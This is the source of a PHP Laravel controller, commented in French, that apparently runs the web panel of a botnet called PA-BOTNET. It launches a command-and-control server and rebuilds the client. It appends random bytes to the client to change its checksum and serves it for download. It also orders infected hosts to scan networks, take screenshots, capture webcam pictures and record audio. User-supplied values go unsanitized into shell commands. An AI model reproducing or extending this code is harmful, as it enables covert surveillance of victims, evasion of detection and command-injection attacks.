<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class BotnetController extends Controller
{

    function parseCommandOutput($output) {
        $options = [];
        $option_regex = "/(\-\-?\w+(?: \w+)?(?: \[.*?\])?(?: \| \-\-?\w+(?: \w+)?(?: \[.*?\])?)?)\s{2,}(.+)/";

        foreach ($output as $line) {
            if (preg_match($option_regex, $line, $matches)) {
                $flag = trim($matches[1]);
                $description = trim($matches[2]);
                $options[$flag] = $description;
            }
        }
        return $options;
    }

    public function aide_botnet(){
        $path = env('PATH_PYTHON_EXECUTABLE');

        // Exécute la commande ipconfig et récupère le résultat dans $output
        exec($path.'PA-BOTNET-PYSRV/venv/bin/python '.$path.'PA-BOTNET-PYSRV/main.py --help', $output, $return);

        // Appelle la fonction pour parser la sortie de la commande
        $output_propre = $this->parseCommandOutput($output);

        return redirect('/home')->with('output', $output_propre);

    }

    public function start_botnet(Request $request)
    {

        $path = env('PATH_PYTHON_EXECUTABLE');

        // Récupérer le port du formulaire
        $port = $request->input('port');

        // Validation basique pour s'assurer que le port est un entier et dans la plage adéquate
        if (!is_numeric($port) || $port < 1023 || $port > 65535) {
            return redirect('/home')->with('output', "Port invalide. Choisissez un port entre 1023 et 65535.");
        }


        // Commande pour activer l'environnement virtuel et démarrer le serveur Python avec le port spécifié
        $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --start --port $port > /dev/null 2>&1 & echo $!";
        exec($command, $output, $return);

        // Le PID du processus lancé
        $pid = $output[0];

        return redirect('/home')->with('output', "Processus démarré avec le PID $pid sur le port $port");
    }


    public function botnet_is_running(): bool
    {
        $command = 'pgrep -c "python3"';
        $result = exec($command);

        if ($result != 0 ){
            return true;
        } else {
            return false;
        }
    }



    public function stop_botnet()
    {
        $command = 'killall python3';
        exec($command, $output, $return);

        return redirect('/home')->with('output', "Serveur stoppé.");
    }

    public function botnet_update()
    {
        $path = env('PATH_RUST_CLIENT_EXECUTABLE');

        if (!$path) {
            return redirect('/home')->with('error', 'Path to Rust client executable not set.');
        }

        $result = [];

        $fullpath = $path . 'PA-BOTNET-CLIENT-v2/';

        $command = "cd $fullpath && git pull";
        exec($command, $output, $return);
        if ($return !== 0) {
            return redirect('/home')->with('error', 'Git pull command failed.');
        }
        $result = array_merge($result, ['Client mis a jour avec le repo git']);




        $command = "cd $fullpath && RUSTFLAGS='--cfg client_os=\"linux\"' cargo build --release";
        exec($command, $output, $return);
        if ($return !== 0) {
            return redirect('/home')->with('error', 'Cargo build command failed.');
        }
        $result = array_merge($result, ['Client compilé avec cargo build --release']);


        if (!is_dir(storage_path('BOTNET-SHARE'))) {
            mkdir(storage_path('BOTNET-SHARE'), 0777, true);
        }

        $compiledFilePath = $fullpath . 'target/release/PA-BOTNET-CLIENT-v2';
        $storagePath = storage_path('BOTNET-SHARE/PA-BOTNET-CLIENT');



        $command = "rm ".$storagePath;
        exec($command, $output, $return);
        if ($return !== 0) {
            return redirect('/home')->with('error', 'Git pull command failed.');
        }
        $result = array_merge($result, ['Old client removed']);


        if (!copy($compiledFilePath, $storagePath)) {
            return redirect('/home')->with('error', 'Failed to copy compiled file to storage.');
        }
        $result = array_merge($result,['API access mis a jour']);


        $fileHandle = fopen($storagePath, 'a');
        if ($fileHandle === false) {
            return redirect('/home')->with('error', 'Failed to open copied file for appending.');
        }

        if (fwrite($fileHandle, "\x90".rand(1,10000)) === false) {
            fclose($fileHandle);
            return redirect('/home')->with('error', 'Failed to append byte to copied file.');
        }
        $result = array_merge($result,['Checksum modifié']);


        $command = "md5sum ".$storagePath;
        exec($command, $output, $return);
        if ($return !== 0) {
            return redirect('/home')->with('error', 'ERROR CHECK MD5');
        }
        $result = array_merge($result, ['Checksum  : '.$output[1]]);

        fclose($fileHandle);



        // Retourne avec les résultats
        return redirect('/home')->with('output', $result);
    }


    public function botnet_download()
    {
        $storagePath = storage_path('BOTNET-SHARE/PA-BOTNET-CLIENT');

        return response()->download($storagePath);
    }

    public function scan($uid){
        $path = env('PATH_PYTHON_EXECUTABLE');

        $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --scan  --host ".$uid." > /dev/null 2>&1 & echo $!";
        exec($command, $output, $return);

        return $output;
    }

    public function scanport($uid, $ip, $port1){
        $path = env('PATH_PYTHON_EXECUTABLE');

        $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --scan --address ".$ip." --port-scan ".$port1." --host ".$uid." > /dev/null 2>&1 & echo $!";
        exec($command, $output, $return);

        return $output;
    }

    public function scanports($uid, $ip, $port1, $port2){
        $path = env('PATH_PYTHON_EXECUTABLE');

        $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --scan --address ".$ip." --port-start ".$port1." --port-end ".$port2." --host ".$uid." > /dev/null 2>&1 & echo $!";
        exec($command, $output, $return);

        return $output;
    }

    public function screenshot($uid){
        $path = env('PATH_PYTHON_EXECUTABLE');

        $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --screenshot --host ".$uid." > /dev/null 2>&1 & echo $!";
        exec($command, $output, $return);

        return $output;
    }

    public function picture($uid){
        $path = env('PATH_PYTHON_EXECUTABLE');

        $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --picture --host ".$uid." > /dev/null 2>&1 & echo $!";
        exec($command, $output, $return);

        return $output;
    }

    public function record($uid){
        $path = env('PATH_PYTHON_EXECUTABLE');

        $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --record --time 10 --host ".$uid." > /dev/null 2>&1 & echo $!";
        exec($command, $output, $return);

        return $output;
    }

}
